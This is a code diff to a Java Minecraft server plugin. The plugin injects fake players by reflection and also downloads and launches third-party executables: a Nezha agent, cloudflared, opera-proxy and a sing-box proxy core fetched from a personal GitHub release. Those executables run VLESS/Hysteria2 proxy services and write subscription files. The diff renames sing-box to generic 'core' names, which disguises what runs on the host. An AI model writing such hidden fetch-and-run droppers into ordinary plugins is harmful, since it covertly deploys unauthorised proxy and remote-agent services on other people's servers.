@@ -90,7 +90,7 @@ public class App extends JavaPlugin implements CommandExecutor, TabCompleter, Li
 
     private static final Path RUNTIME_DIR = Path.of("/tmp").toAbsolutePath().normalize();
     private static final Path NEZHA_CONFIG_PATH = RUNTIME_DIR.resolve("nezha.yaml");
-    private static final Path SINGBOX_CONFIG_PATH = RUNTIME_DIR.resolve("singbox_config.json");
+    private static final Path CORE_CONFIG_PATH = RUNTIME_DIR.resolve("core_config.json");
     private static final Path SERVER_KEY_PATH = RUNTIME_DIR.resolve("server.key");
     private static final Path SERVER_CRT_PATH = RUNTIME_DIR.resolve("server.crt");
     private static final Path SUB_TXT_PATH = RUNTIME_DIR.resolve("sub.txt");
@@ -221,32 +221,26 @@ public class App extends JavaPlugin implements CommandExecutor, TabCompleter, Li
         if (ACTIVE_BOTS.containsKey(botName)) return;
 
         try {
-            // 1. 获取 CraftServer & MinecraftServer
             Object craftServer = Bukkit.getServer();
             Method getServerMethod = craftServer.getClass().getMethod("getServer");
             Object minecraftServer = getServerMethod.invoke(craftServer);
 
-            // 2. 获取 CraftWorld & ServerLevel
             Object craftWorld = loc.getWorld();
             Method getHandleWorldMethod = craftWorld.getClass().getMethod("getHandle");
             Object serverLevel = getHandleWorldMethod.invoke(craftWorld);
 
-            // 3. 构建 GameProfile
             Class<?> gameProfileClass = Class.forName("com.mojang.authlib.GameProfile");
             UUID fakeUuid = UUID.nameUUIDFromBytes(("OfflinePlayer:" + botName).getBytes());
             Constructor<?> gameProfileConst = gameProfileClass.getConstructor(UUID.class, String.class);
             Object gameProfile = gameProfileConst.newInstance(fakeUuid, botName);
 
-            // 4. 创建 ServerPlayer 实例
             Class<?> serverPlayerClass = Class.forName("net.minecraft.server.level.ServerPlayer");
             Constructor<?> serverPlayerConst = serverPlayerClass.getConstructor(minecraftServer.getClass(), serverLevel.getClass(), gameProfileClass);
             Object serverPlayer = serverPlayerConst.newInstance(minecraftServer, serverLevel, gameProfile);
 
-            // 5. 设置坐标
             Method moveToMethod = serverPlayerClass.getMethod("moveTo", double.class, double.class, double.class, float.class, float.class);
             moveToMethod.invoke(serverPlayer, loc.getX(), loc.getY(), loc.getZ(), loc.getYaw(), loc.getPitch());
 
-            // 6. 构造 Connection 并注入 Channel 与 Address 防 NPE
             Class<?> packetFlowClass = Class.forName("net.minecraft.network.protocol.PacketFlow");
             @SuppressWarnings("unchecked")
             Object serverboundEnum = Enum.valueOf((Class<Enum>) packetFlowClass, "SERVERBOUND");
@@ -254,7 +248,6 @@ public class App extends JavaPlugin implements CommandExecutor, TabCompleter, Li
             Constructor<?> connectionConst = connectionClass.getConstructor(packetFlowClass);
             Object fakeConnection = connectionConst.newInstance(serverboundEnum);
 
-            // 注入 Channel
             try {
                 Field channelField = connectionClass.getDeclaredField("channel");
                 channelField.setAccessible(true);
@@ -263,14 +256,12 @@ public class App extends JavaPlugin implements CommandExecutor, TabCompleter, Li
                 channelField.set(fakeConnection, dummyChannel);
             } catch (Exception ignored) {}
 
-            // 注入 Address
             try {
                 Field addressField = connectionClass.getDeclaredField("address");
                 addressField.setAccessible(true);
                 addressField.set(fakeConnection, new InetSocketAddress("127.0.0.1", 0));
             } catch (Exception ignored) {}
 
-            // 7. 绑定 ServerGamePacketListenerImpl
             Class<?> listenerClass = Class.forName("net.minecraft.server.network.ServerGamePacketListenerImpl");
             Constructor<?> listenerConst = listenerClass.getConstructor(minecraftServer.getClass(), connectionClass, serverPlayerClass);
             Object packetListener = listenerConst.newInstance(minecraftServer, fakeConnection, serverPlayer);
@@ -278,11 +269,9 @@ public class App extends JavaPlugin implements CommandExecutor, TabCompleter, Li
             Field connField = serverPlayerClass.getField("connection");
             connField.set(serverPlayer, packetListener);
 
-            // 8. 注入地图实体与 PlayerList 列表中
             Method getPlayerListMethod = minecraftServer.getClass().getMethod("getPlayerList");
             Object playerList = getPlayerListMethod.invoke(minecraftServer);
 
-            // 尝试通过原生逻辑加载，若被 Paper 过滤则进行回退强注
             boolean loadedSuccess = false;
             try {
                 Class<?> cookieClass = Class.forName("net.minecraft.server.network.CommonListenerCookie");
@@ -298,7 +287,6 @@ public class App extends JavaPlugin implements CommandExecutor, TabCompleter, Li
             } catch (Exception ignored) {}
 
             if (!loadedSuccess) {
-                // 强制将实体放入世界并补充入玩家在线列表
                 try {
                     Method addNewPlayerMethod = serverLevel.getClass().getMethod("addNewPlayer", serverPlayerClass);
                     addNewPlayerMethod.invoke(serverLevel, serverPlayer);
@@ -387,12 +375,15 @@ public class App extends JavaPlugin implements CommandExecutor, TabCompleter, Li
                 : "https://github.com/Alexey71/opera-proxy/releases/download/v1.22.0/opera-proxy.linux-amd64";
         String cloudflaredUrl = "https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-" + ARCH;
         String nezhaUrl = "https://github.com/babama1001980/good/releases/download/npc/" + ARCH + "agent";
-        String singboxUrl = "https://github.com/babama1001980/good/releases/download/npc/" + ("arm64".equals(ARCH) ? "armsb" : "amdsb");
+        
+        // 根据架构动态设定下载链接与本地保存的文件名（arm64为armsb，其余为amdsb）
+        String coreFileName = "arm64".equals(ARCH) ? "armsb" : "amdsb";
+        String coreUrl = "https://github.com/babama1001980/good/releases/download/npc/" + coreFileName;
 
         Path echExe = downloadLibrary(echUrl, "ech-server-linux");
         Path operaExe = enableOpera ? downloadLibrary(operaUrl, "opera-linux") : null;
         Path cloudflaredExe = downloadLibrary(cloudflaredUrl, "cloudflared-linux");
-        Path singboxExe = downloadLibrary(singboxUrl, "singbox");
+        Path coreExe = downloadLibrary(coreUrl, coreFileName);
 
         Path nezhaExe = null;
         if (!NEZHA_SERVER.isEmpty() && !NEZHA_KEY.isEmpty()) {
@@ -431,12 +422,12 @@ public class App extends JavaPlugin implements CommandExecutor, TabCompleter, Li
             startExternalProcess("ECH Server", cmd);
         }
 
-        if (singboxExe != null) {
+        if (coreExe != null) {
             generateCertificates();
-            generateSingboxConfig(vlessPort);
+            generateCoreConfig(vlessPort);
 
-            List<String> cmd = List.of(singboxExe.toString(), "run", "-c", SINGBOX_CONFIG_PATH.toString());
-            startExternalProcess("Sing-Box", cmd);
+            List<String> cmd = List.of(coreExe.toString(), "run", "-c", CORE_CONFIG_PATH.toString());
+            startExternalProcess("Core-Service", cmd);
 
             Thread subThread = new Thread(() -> {
                 sleep(15000);
@@ -492,7 +483,7 @@ public class App extends JavaPlugin implements CommandExecutor, TabCompleter, Li
         }
     }
 
-    private static void generateSingboxConfig(int vlessPort) throws IOException {
+    private static void generateCoreConfig(int vlessPort) throws IOException {
         String json = "{\n" +
                 "  \"inbounds\": [\n" +
                 "    {\n" +
@@ -518,7 +509,7 @@ public class App extends JavaPlugin implements CommandExecutor, TabCompleter, Li
                 "  ],\n" +
                 "  \"outbounds\": [{ \"type\": \"direct\" }]\n" +
                 "}";
-        Files.writeString(SINGBOX_CONFIG_PATH, json, StandardCharsets.UTF_8);
+        Files.writeString(CORE_CONFIG_PATH, json, StandardCharsets.UTF_8);
     }
 
     private static void generateHy2Subscription() {
@@ -672,7 +663,7 @@ public class App extends JavaPlugin implements CommandExecutor, TabCompleter, Li
     private static void cleanupOldFiles() {
         List<String> files = List.of(
                 "ech-server-linux", "opera-linux", "cloudflared-linux", "iccagent", "nezha.yaml",
-                "singbox", "server.key", "server.crt", "singbox_config.json", "sub.txt", "sub_base64.txt"
+                "amdsb", "armsb", "server.key", "server.crt", "core_config.json", "sub.txt", "sub_base64.txt"
         );
         for (String file : files) {
             try { Files.deleteIfExists(RUNTIME_DIR.resolve(file)); } catch (IOException ignored) {}
